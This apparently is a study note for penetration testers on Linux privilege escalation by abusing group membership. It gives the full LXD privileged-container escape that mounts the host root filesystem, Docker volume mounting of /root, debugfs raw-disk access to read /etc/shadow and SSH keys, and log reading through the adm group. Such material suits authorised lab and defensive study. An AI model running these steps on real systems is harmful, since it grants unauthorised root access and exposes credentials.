#  LXC / LXD Privilege Escalation 
---

## 🔹 STEP 1: Check group membership

```bash
id
```

### Breakdown:

- `id` → prints:
    
    - UID (user ID)
        
    - GID (group ID)
        
    - all groups user belongs to
        

### Why important:

If output contains:

```
lxd
```

👉 means user can create containers → possible root escape

---

## 🔹 STEP 2: Extract Alpine image

```bash
unzip alpine.zip
```

### Breakdown:

- `unzip` → extracts compressed archive
    
- `alpine.zip` → container image package
    

### Output contains:

- `alpine.tar.gz`
    
- root filesystem image
    

---

## 🔹 STEP 3: Enter directory

```bash
cd 64-bit\ Alpine/
```

### Breakdown:

- `cd` → change directory
    
- `\` → escape space in folder name
    
- `64-bit Alpine/` → extracted image folder
    

---

## 🔹 STEP 4: Initialize LXD

```bash
lxd init
```

### Breakdown (what happens internally):

- sets storage backend (dir/zfs)
    
- configures container environment
    
- sets network bridge
    

Even if errors occur → LXD may still work

---

## 🔹 STEP 5: Import Alpine image

```bash
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
```

### Breakdown:

- `lxc image import` → adds local image to LXD
    
- `alpine.tar.gz` → container filesystem
    
- `alpine.tar.gz.root` → metadata/signature file
    
- `--alias alpine` → name shortcut for later use
    

👉 After this, container image is available as `alpine`

---

## 🔹 STEP 6: Create privileged container

```bash
lxc init alpine r00t -c security.privileged=true
```

### Breakdown:

- `lxc init` → create container (not started yet)
    
- `alpine` → image name
    
- `r00t` → container name
    
- `-c` → configuration flag
    
- `security.privileged=true` →
    
    - disables UID mapping
        
    - container root = HOST root ⚠️
        

👉 THIS is the escalation point

---

## 🔹 STEP 7: Mount host filesystem

```bash
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
```

### Breakdown:

- `lxc config device add` → attach storage device
    
- `r00t` → container name
    
- `mydev` → device label
    
- `disk` → type of device
    
- `source=/` → mount host root filesystem
    
- `path=/mnt/root` → inside container mount location
    
- `recursive=true` → include all subdirectories
    

👉 Now container sees FULL host system

---

## 🔹 STEP 8: Start container

```bash
lxc start r00t
```

### Breakdown:

- starts container named `r00t`
    
- loads configuration + mounts filesystem
    

---

## 🔹 STEP 9: Enter container shell

```bash
lxc exec r00t /bin/sh
```

### Breakdown:

- `lxc exec` → run command inside container
    
- `r00t` → container name
    
- `/bin/sh` → shell spawn
    

👉 You now enter container

---

## 🔹 STEP 10: Confirm root

```bash
id
```

### Output:

```
uid=0(root) gid=0(root)
```

### Meaning:

- You are ROOT of host system
    

---

#  Docker Privilege Abuse

## Command:

```bash
docker run -v /root:/mnt -it ubuntu
```

### Breakdown:

- `docker run` → start container
    
- `-v /root:/mnt` →
    
    - mounts host `/root`
        
    - inside container at `/mnt`
        
- `-it` → interactive terminal
    
- `ubuntu` → base image
    

### Result:

- You can read host root files
    
- SSH keys, configs, flags exposed
    

---

# Disk Group Abuse

## Command:

```bash
debugfs /dev/sda1
```

### Breakdown:

- `debugfs` → filesystem debugger tool
    
- `/dev/sda1` → raw disk partition
    

### Why dangerous:

- bypasses OS permissions
    
- direct filesystem access
    

### Impact:

- read `/etc/shadow`
    
- extract SSH keys
    
- modify system files
    

---

# ADM Group Abuse

## Command:

```bash
cat /var/log/*
```

### Breakdown:

- `cat` → read file contents
    
- `/var/log/*` → all system logs
    

### What you get:

- login history
    
- cron jobs
    
- possible credentials in logs
    

---


###  LXD group

- container = root on host
    
- most powerful abuse
    

###  Docker group

- mount `/` = full system access
    

### Disk group

- raw disk access = full compromise
    

###  ADM group

- only log reading (info leak)
